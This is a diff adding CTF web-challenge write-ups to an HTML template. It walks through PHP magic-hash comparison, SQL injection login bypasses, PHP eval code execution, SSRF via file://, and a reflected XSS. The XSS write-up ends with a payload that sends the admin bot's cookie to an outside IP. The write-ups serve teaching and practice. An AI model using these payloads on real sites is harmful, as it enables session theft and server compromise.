@@ -1,5 +1,9 @@
 {% extends 'base.html' %}
 {% block content%}
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Josefin+Sans:wght@300&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Gemunu+Libre:wght@300&family=Space+Mono&display=swap');
+</style>
 <div class="content-m" style="margin-top: 50px;">
   <br><br><br><br>
   <div>
@@ -7,38 +11,203 @@
   </div>
   <br>
   <div class='ctf-tasks' style="text-align: left; margin: 0px 0px 0px 10%;">
+
+    <br><br><p>NOTE : WEB CHALLENGES ONLY</p>
+    <p>If you have a question about any of these tasks or any web task from SecurinetsFriendlyCTF 21, feel free to <a href="/contact/">contact</a> me</p>
+    <br><br>
     <p>Tasks</p><br><br>
     <a href='#loose-comparaison'>Loose comparaison <score style="color: rgb(0, 255, 55);">[100]</score></a> <br>
     <a href='#obfuscated-js'>Obfuscated JS <score style="color: rgb(0, 255, 55);">[100]</score></a> <br>
     <a href='#sqli-1'>SQLI 1 <score style="color: rgb(0, 255, 55);">[100]</score></a> <br>
     <a href='#sqli-2'>SQLI 2 <score style="color: rgb(218, 122, 32);">[711]</score></a> <br>
-    <a href='#eval'>Eval <score style="color: rgb(0, 255, 55);">[471]</score></a> <br>
+    <a href='#eval'>Eval <score style="color: rgb(229, 255, 0);">[375]</score></a> <br>
     <a href='#ssrf'>SSRF <score style="color: rgb(218, 122, 32);">[775]</score></a> <br>
-    <a href='#easy-xss'>easy XSS <score style="color: rgb(218, 91, 32);">[964]</sco></a> <br><br><br> 
-    
-    <p>Writeups</p><br><br>
-    
-    <a id="loose-comparaison" href='#loose-comparaison' class="task">Loose comparaison <score style="color: rgb(0, 255, 55);">[100]</score></a> <br><br>
-
-
-    <a id="obfuscated-js" href='#obfuscated-js' class="task">Obfuscated JS <score style="color: rgb(0, 255, 55);">[100]</score></a> <br><br>
-
-
-    <a id="sqli-1" href='#sqli-1' class="task">SQLI 1 <score style="color: rgb(0, 255, 55);">[100]</score></a> <br><br>
-
-
-    <a id="sqli-2" href='#sqli-2' class="task">SQLI 2 <score style="color: rgb(218, 122, 32);">[711]</score></a> <br><br>
-
-
-    <a id="eval" href='#eval' class="task">Eval <score style="color: rgb(0, 255, 55);">[471]</score></a> <br><br>
-
-
-    <a id="ssrf" href='#ssrf' class="task">SSRF <score style="color: rgb(218, 122, 32);">[775]</score></a> <br><br>
-
-
-    <a id="xss" href='#easy-xss' class="task">easy XSS <score style="color: rgb(218, 91, 32);">[964]</sco></a> <br><br>
-
+    <a href='#easy-xss'>easy XSS <score style="color: rgb(218, 69, 32);">[900]</sco></a>
+  <br><br><br>
+    <p>Writeups</p><br>
+    <div style="color: white;font-size: 19px;font-family: 'Josefin Sans', sans-serif;">
+      <!-- LOOSE COMPARAISON -->
+      <br><br><a id="loose-comparaison" href='#loose-comparaison' class="task">Loose comparaison <score style="color: rgb(0, 255, 55);">[100]</score></a> <br><br><br>
+      <a href="https://paste.myst.rs/t2zdkh9k">Source code</a><br><br>
+      Hmm. It looks like we need to make this if statment return true to get the flag<br><br>
+      <div class="code">
+        if(hash('md5',$input)=="0")  
+      </div> <br><br>
+      But how can a hash of our input return 0 ?????<br>
+      or maybe we need to do something else! Looking at the task name we see that there is something with comparaison<br>
+      They are using == instead of ===, then its probably about magic hashes.<br>
+      If we can make a hash return 0e123123123 or any number after the e then it will equal to 0<br>
+      Just <a href="https://www.google.com/search?q=md5+magic+hashes&sxsrf=AOaemvLf-Q3Q3jHO2_WXKPBUE6TD5JE_Ig%3A1632906509594&source=hp&ei=DS1UYbKCItOcgQa_yp-gCQ&iflsig=ALs-wAMAAAAAYVQ7HZ0bTrIWGjD-kwTgDNKK9MMw9vOR&ved=0ahUKEwjyvNDj6qPzAhVTTsAKHT_lB5QQ4dUDCAc&uact=5&oq=md5+magic+hashes&gs_lcp=Cgdnd3Mtd2l6EAMyBQgAEIAEUIEHWIEHYKoKaABwAHgAgAGcAYgBnAGSAQMwLjGYAQCgAQKgAQE&sclient=gws-wiz" target="_blank">googling md5 magic hashes</a> and we will get a result of bunch of inputs like that <br><br>
+      <div class="code">md5('240610708') == 0e462097431906509019562988736854</div><br>
+      <img src=https://i.imgur.com/5MATsUZ.png" width="520px" style="max-width: 90%;"><br><br>
+      And as i said they are not using === so php won't check if the string content is the same and they both string.<br>
+      PHP will just check if the value somehow the same
+      and just by sendthe unhashed string to the magic a parameter we should get the flag<br>
+      <a href="http://40.114.76.220:84/?magic=240610708" target="_blank">http://40.114.76.220:84/?magic=240610708</a>
+      <div class="endline">Securinets{I_REALLY_L3VE_PhP_<3}</div>
       
+      <!-- Obfuscated JS -->
+      <br><br><a id="obfuscated-js" href='#obfuscated-js' class="task">Obfuscated JS <score style="color: rgb(0, 255, 55);">[100]</score></a> <br><br><br>
+      <a href="https://paste.myst.rs/gm2zm0w1" target="_blank">Source code</a> <br><br>
+      Obfuscating an javascript file means trying to make it complex or not readable by humain
+      for example converting this script<br><br>
+      <div class="code">var x = [52,43,23];<br>
+      alert(x[2]+x[1]);<br>
+      if(x[0] == 52){<br>
+      &nbsp;&nbsp;&nbsp;alert(x[2]);<br>
+      }</div><br>
+      to this<br><br>
+      <div class="code">var x=[0x34,0x2b,0x17];alert(x[0x2]+x[0x1]);x[0x0]==0x34&&alert(x[0x2]);</div><br>
+      They both javascript files and do the same job<br>
+      but one is understandable by human and one is not<br>
+      And to convert an Obfuscated JS to human-readable JS<br>
+      you need to use tools that trie to help you<br><br>
+      links : <a href="https://lelinhtinh.github.io/de4js/" target="_blank">de4js</a><br>
+      After putting the source <a href="https://paste.myst.rs/gm2zm0w1">Source code</a> there you should find the flag<br><br>
+      <img src="https://i.imgur.com/Vv9HvsM.png" width="520px" style="max-width: 90%;"><br><br>
+      <div class="endline">Securinets{OBFUSCATION PROTECTS YOUR JS C0DE!!}</div>
+
+      <!-- SQLI 1 -->
+      <br><br><a id="sqli-1" href='#sqli-1' class="task">SQLI 1 <score style="color: rgb(0, 255, 55);">[100]</score></a> <br><br><br>
+      
+      Source Code (provided with the task):<br><br>
+      <div class="code">SELECT username FROM users WHERE username='".$_POST['username']."'and password='".$_POST['password'].';</div>
+      <br>
+
+      Alright let's see what is waiting for us at <a href='http://40.114.76.220:8087' target="_blank">http://40.114.76.220:8087/</a><br><br>
+      <img src="https://i.imgur.com/8RgDS8r.png" width="520px" style="max-width: 90%;"><br>
+      A login form?? and the task is called SQLI1 that means its an <a href='https://owasp.org/www-community/attacks/SQL_Injection' target="_blank">SQL Injection</a>
+      let's do a small check. By typing [' "] at our username field and [x] at our password<br>
+      So the whole statment become<br><br>
+      <div class="code">SELECT username FROM users WHERE username=''"'and password='x';</div><br>
+      and this part make the error<br><br>
+      <div class="code">username=''"'</div><br>
+      <img src="https://i.imgur.com/S392eTM.png" width="520px" style="max-width: 90%;"><br><br>
+      GREAT! looks like they are not filtring our statment or using a <a href="https://dev.mysql.com/doc/refman/5.7/en/sql-prepared-statements.html" target="_blank">safer way</a> to execute SQL queries<br>
+      Let's play with this and try to login with details <br><br>
+      <div class="code" style="max-width: 240px;">
+        username : ' or 1=1#<br>
+        password : x
+      </div><br><br>
+      To be honest. it will work but let's see why..<br><br>
+      <div class="code">SELECT username FROM users WHERE username='' or 1=1#  and password='x';</div><br>
+      The # char is an char that <a href='https://en.wikipedia.org/wiki/Comment_(computer_programming)' target="_blank">comment</a> everything after it in <a href="https://www.mysql.com/" target="_blank">MySQL</a> and many more dbms<br><br>
+      <img src="https://i.imgur.com/tSyJ5Jx.png" width="520px" style="max-width: 90%;"><br><br><br>
+      <div class="endline">Securinets{G33d_J0b_H4Ck3R!!}</div>
+
+      <!-- SQLI 2 -->
+      <br><br><a id="sqli-2" href='#sqli-2' class="task">SQLI 2 <score style="color: rgb(218, 122, 32);">[711]</score></a> <br><br><br>
+      <a href="https://pastebin.com/Mv9T56bK" target="_blank">Source code</a><br>
+      <a href="http://40.114.76.220:8088/index.php" target="_blank">LINK</a><br><br>
+      
+      After you've finished SQLI 1, I think that you have a little bit of knowledge  about SQL Injections now!      <br>
+      Looking at the <a href="https://pastebin.com/Mv9T56bK" target="_blank">Source code</a> looks like we need to make this if statment return true to get the flag<br><br>
+      <div class="code">if( $row["username"]=="admin") {</div><br>
+      but its easy right? if you have a small experience with <a href='https://portswigger.net/web-security/sql-injection/union-attacks' target="_blank">UNION</a><br>
+      we should be able to send admin as our usernmae and pass the challenge by<br><br>
+      <div class="code">Username : ' UNION SELECT 'admin';#<br>Password : x</div><br>
+      <img src="https://i.imgur.com/4G4RqOL.png" width="520px" style="max-width: 90%;"><br><br>
+      But instead we get this error ("admin" detected .. what are u doing here Hacker ?!)<br>
+      hmm. thats weird! let's check back the source code to see why we are getting this message instead of the flag<br><br>
+      <div class="code">
+        	if(preg_match("/admin/i",$username))   <br>
+	        {<br>
+		      &nbsp;&nbsp;&nbsp;die('"admin" detected .. what are u doing here Hacker ?!');<br>
+	        }
+      </div><br>
+      Off.. an <a href="https://www.php.net/manual/en/function.preg-match.php" target="_blank">preg match</a> to check if we have the word "admin" in our input.<br>
+      oh nvm i remember a function called <a href='https://www.w3schools.com/SQL/func_sqlserver_concat.asp' target='_blank'>CONCAT</a> in SQL that takes two strings and connect them together<br>
+      so instead of typing the word admin we can just type CONCAT('ad','min')<br>
+      lets try our payload again but this time replacing admin with CONCAT('ad','min')<br><br>
+      <div class="code">Username : ' UNION SELECT CONCAT('adm','in');#<br>Password : x</div><br><br>
+      <img src=https://i.imgur.com/5Dfw4tC.png" width="520px" style="max-width: 90%;"><br><br>
+      WOW, to be honest I didn't expect it to work from the first try xD<br>
+      <div class="endline">Securinets{SQLi_have_no_LIMIT!!!}</div>
+
+      <!-- EVAL -->
+      <br><br><a id="eval" href='#eval' class="task">Eval <score style="color: rgb(229, 255, 0);">[375]</score></a> <br><br><br>
+      <b>NOTE : THE FLAG IN <f style="color: purple;">/flag.txt</f></b><br>
+      Lets check the the <a href="http://40.114.76.220:8089/" target="_blank">task</a> really quick<br><br>
+      <img src="https://i.imgur.com/zm9Old1.png" width="360px" style="max-width: 90%;"><br><br>
+      Hmm. its just a normal calculator isn't it ??<br>
+      Just looking at the task name we know that the task is talking about the <a href='https://www.php.net/manual/en/function.eval.php' target="_blank">EVAL function</a><br><br>
+      PLEASE DO NOT USE EVAL. it is very dangerous.. I don't know if thats scary enought but we will see what we can do with it<br><br>
+      <img src=https://i.imgur.com/bWNfhz9.png" width="740px" style="max-width: 90%;"><br><br>
+      Let's open the task with <a href="https://portswigger.net/burp" target="_blank">burpsuite</a> so we can see what is exactly going on <i>(You don't need to)</i><br>
+      i tried calculating 6-3 and it looks like the page send POST Request to the eval.php and then execute the eval function on the server<br><br>
+      <img src="https://i.imgur.com/S5iYuxp.png" width="740px" style="max-width: 90%;"><br><br>
+      <div class="code">&lt;?php<br>&nbsp;&nbsp;&nbsp;eval($_POST['expression'])<br></div><br>
+      So let's change the 6-3 in burpsuite to an actualy php command and click forward <br><br>
+      <div class="code">print(99);</div><br>
+      <img src="https://i.imgur.com/q3l7bE9.png" width="320px" style="max-width: 90%;"><br><br>
+      Let's ignore the 1 because its just the return of the function but it works!<br>
+      if we can execute any php command lets just change the 6-3 to something that can read the flag.txt for us like <a href="https://www.php.net/manual/en/function.readfile.php" target="_blank">readfile()</a> <br><br>
+      <div class="code">readfile('/flag.txt');</div><br>
+      <img src="https://i.imgur.com/K7rdzkP.png" width="420px" style="max-width: 90%;"><br><br>
+      <div class="endline">Securinets{E4AL_1S_EV3LLLL}</div>
+
+      <!-- SSRF -->
+      <br><br><a id="ssrf" href='#ssrf' class="task">SSRF <score style="color: rgb(218, 122, 32);">[775]</score></a> <br><br><br>
+      <a href="http://40.114.76.220:8090/index.php">LINK</a><br>
+      NOTE : The flag is in the root directory /flag.txt<br><br>
+      <img src=https://i.imgur.com/CJ0XCwS.png" width="520px" style="max-width: 90%;"><br><br>
+      Looks like we have an CURL service that will send an curl request to any service we provide<br>
+      Let's just start with <a href="http://amazon.com" target="_blank">amazon.com</a><br><br>
+      <div class="code">http://amazon.com</div><br>
+      <img src="https://i.imgur.com/3KO3V5Y.png" width="520px" style="max-width: 90%;"><br><br>
+      I first tried accesing the root directory like that, then i got an 404 STATUS and rememberd that this is not how we access the root directory<br><br>
+      <div class="code">http://40.114.76.220:8090/../../../flag.txt</div><br>
+      So i tried changing the <a href="https://en.wikipedia.org/wiki/List_of_URI_schemes" target="_blank">url scheme</a> from <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol" target="_blank">HTTP</a> to <a href="https://en.wikipedia.org/wiki/File_URI_scheme" target="_blank">FILE</a><br><br>
+      <div class="code">file://flag.txt</div><br>
+      <img src="https://i.imgur.com/XoD1OmR.png" width="520px" style="max-width: 90%;">
+      <div class="endline">Securinets{S3rv3r_S1de_Request_F0rgery}</div>
+
+      <!-- EASY XSS -->
+      <br><br><a id="easy-xss" href='#easy-xss' class="task">easy XSS <score style="color: rgb(218, 69, 32);">[900]</sco></a> <br><br><br>
+        <b>NOTE : </b>
+        <a href="http://52.224.124.194/" target="_blank">LINK</a><br><br>
+        LESGOOOO it's <a href="https://owasp.org/www-community/attacks/xss/" target="_blank">XSS</a> :'), my favoriute type of web attacks
+        <br>
+        After visiting the <a href="http://52.224.124.194/" target="_blank">LINK</a> we see that we have 2 pages <x style="color: rebeccapurple;">(/index.php and /report.php)</x><br>
+        lets start with the <x style="color: rebeccapurple;">Home page (index.php)</x><br><br>
+        <img src="https://i.imgur.com/wIdStCh.png" width="500px" style="max-width: 90%;"><br><br>
+        We have an input with submit button let's type something and click it to see what will happen<br><br>
+        <img src="https://i.imgur.com/eVPKt3C.png" width="500px" style="max-width: 90%;"><br><br>
+        It takes me to the same page but with parameter <x style="color: red;">?name=</x>  (the text i chosed) and desplaying it under the input field. <br>
+        Changing the parameter value on the url and pressing enter will change the content of the page!<br>
+        Now let's see if they are using any filtering system to clear the paramater <x style="color: red;">?name=</x> from <x style="color: yellow;">javascript/xss</x> before rendering it.<br>
+        I changed the url from 
+        <div class="code">http://52.224.124.194/index.php?name=random-textexample</div>
+        to
+        <div class="code">http://52.224.124.194/index.php?name=&lt;script>alert(1)<&sol;script></div>
+        <x style="color: orange;">Note: The arrow that you see <x style="color: rgb(63, 194, 63);font-family: 'Space Mono', monospace;"> &lt;/</x> is actually <x style="color: rgb(63, 194, 63);">&lt;/</x></x> (its because of the font i'm using 😥)<br>
+        <img src="https://i.imgur.com/674yGLx.png" width="500px" style="max-width: 90%;"><br><br>
+        And BOOM the <x style="color: yellow">JS Code</x> that we injected works! now anyone will visit this url will get this alert popup. that's what we call <x style="color: yellow;">Reflected XSS</x><br>
+        Now let's check the <x style="color: rebeccapurple;">Report page (report.php)</x><br><br>
+        <img src="https://i.imgur.com/TMIWeCh.png" width="500px" style="max-width: 90%;"><br><br>
+        Hmm looks like this is a page where we send our links and the bot/admin will visit them<br>
+        lets just put the link that we generated<br><br>
+        <div class="code">http://52.224.124.194/index.php?name=&lt;script>alert(1)<&sol;script></div><br>
+        I was expecting something to happen but it didn't<br>
+        I knew it could be that the bot wasn't able to click the ok button the alert() so i tried something else<br><br>
+        <div class="code">http://52.224.124.194/index.php?name=&lt;script>console.log("hacker")<&sol;script></div><br>
+        Visiting the link by my own to check if the XSS is coorect: <br><br>
+        <img src="https://i.imgur.com/ESq4Lkv.png" width="500px" style="max-width: 90%;"><br><br>
+        Pasting the link again on <x style="color: rebeccapurple;">report.php:</x> <br><br>
+        <img src="https://i.imgur.com/sm91i3P.png" width="500px" style="max-width: 90%;"><br><br>
+        Yehooo! looks like the bot was infected by our js code :]<br>
+        Now we can steal his 🍪 instead of just printing something on his console. RIGHT ?
+        This is the payload i used<br><br>
+        <div style="font-family:Gemunu Libre;font-size: 19px;" class="code">http://52.224.124.194/index.php?name=&lt;script>document.location="http://192.123.123.123?p=" %2b document.cookie&lt;/script></div>
+        <b>Note: the <x style="color: violet;">%2b</x> is just an <a href="https://www.urlencoder.net/" target="_blank">url encoding</a> of <x style="color: violet;">+</x></b> <br>
+        <b>Note: the ip addres <x style="color: violet;">http://192.123.123.123</x> is representing my apache server with <a href="https://paste.myst.rs/nq2a61wj" target="_blank">source code</a></b><br>
+        If you don't want make/host your own website you can use alternatives like ( <a href="https://webhook.site/" target="_blank">https://webhook.site/</a> , <a href="https://postb.in/" target="_blank">https://postb.in/</a> )<br><br>
+        <img src="https://i.imgur.com/l5QHJJE.png" width="500px" style="max-width: 90%;"><br><br>
+        <div class="endline">Securinets{Cr0s5_s1t3_ScRiPt1nG!!!!!!} </div>
+
+        <br><br><br><br>
+      </div>
+      </div>
   </div>
   
   <br>
